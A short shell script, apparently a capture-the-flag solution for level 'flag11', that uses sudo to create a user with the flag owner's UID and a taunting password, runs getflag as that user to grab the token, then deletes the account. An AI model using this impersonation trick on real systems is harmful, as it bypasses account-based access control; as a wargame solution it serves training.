#!/bin/sh

sudo useradd \
  --no-create-home \
  --no-user-group \
  --password '💀 You have been hacked! 💀' \
  --uid 3011 \
  flag11
echo -n 'flag11: '
sudo -u flag11 getflag | grep -oE '[^ ]+$'
sudo userdel flag11
